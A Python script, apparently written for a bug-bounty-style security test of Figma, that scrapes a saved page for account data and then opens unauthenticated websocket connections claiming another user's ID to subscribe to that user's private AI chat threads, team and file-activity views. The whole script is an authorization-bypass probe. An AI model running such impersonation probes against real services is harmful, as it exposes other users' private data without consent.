# -*- coding: utf-8 -*-
"""1. 从 INITIAL_OPTIONS.account_picker_data 提取 A 的 org/team 信息
2. 身份信任测试:userId=UID_A 匿名连接(不带 cookie)订阅 A/B 资源
"""
import json, re, time, websocket, sys
sys.path.insert(0, 'D:/scan/figma_report')
from _figma_creds import UID_A, UID_B, FILE_A, FILE_B, TEAM_A

# ---- 1. account_picker_data 里 A 的信息 ----
c = open('D:/scan/figma_report/_js/app_file_b.html', 'r', encoding='utf-8', errors='ignore').read()
scripts = re.findall(r'<script(?![^>]*src)[^>]*>(.*?)</script>', c, re.S)
for s in scripts:
    if 'account_picker_data' in s:
        m = re.search(r'account_picker_data"\s*:\s*({.*?}),"', s)
        if m:
            try:
                d = json.loads('{' + m.group(1) + '}')
                print('account_picker_data keys:', list(d.keys()))
                print(json.dumps(d, ensure_ascii=False, indent=1)[:2000])
            except Exception as e:
                print('parse err', e)
                i = s.find('account_picker_data')
                print(s[i:i+1500])
        break

print()
# ---- 2. 身份信任测试 ----
CLIENT_URL = 'https://www.figma.com/file/%s' % FILE_A

def conn(view_name, args, label, userId, cookie_header=None):
    url = ('wss://www.figma.com/api/livegraph?pv=1&userId=%s&anonUserId=&clientType=web'
           '&preload=%%7B%%7D&requestedProtocolVersion=2&clientUrl=%s&connectionType=initial&reconnect=0'
           % (userId, CLIENT_URL))
    hdrs = ['User-Agent: Mozilla/5.0']
    if cookie_header:
        hdrs.append('Cookie: ' + cookie_header)
    ws = websocket.create_connection(url, timeout=10, header=hdrs)
    ws.send(json.dumps({'messageType': 'auth', 'clientType': 'web',
                        'args': {'userId': userId, 'anonymousUserId': None},
                        'tags': {'clientType': 'web', 'clientUrl': CLIENT_URL},
                        'clientRequestedVersion': 2}))
    time.sleep(0.4)
    ws.send(json.dumps({'messageType': 'subscribe', 'viewName': view_name,
                        'viewHash': 'abababababababababababababababab',
                        'loadType': 'initial', 'args': args}))
    msgs = []
    ws.settimeout(5)
    try:
        while True:
            msgs.append(ws.recv())
    except Exception:
        pass
    ws.close()
    print('=== %s ===' % label)
    for m in msgs:
        print('  ', m[:700].replace('\n', ' '))
    print()

# 关键测试:声称 userId=A(不提供任何凭据)订阅 A 的私有数据
conn('PaginatedUserAiChatThreadsView',
     {'firstPageSize': 10, 'ownerId': UID_A, 'userId': UID_A},
     '声称A身份 订阅A的AI线程(无凭据)',
     UID_A)
conn('TeamByIdForPlanUserView', {'teamId': TEAM_A},
     '声称A身份 订阅A团队(无凭据)',
     UID_A)
conn('ActiveFileUsersForFileView', {'fileKey': FILE_A},
     '声称A身份 订阅A文件活跃用户(无凭据)',
     UID_A)
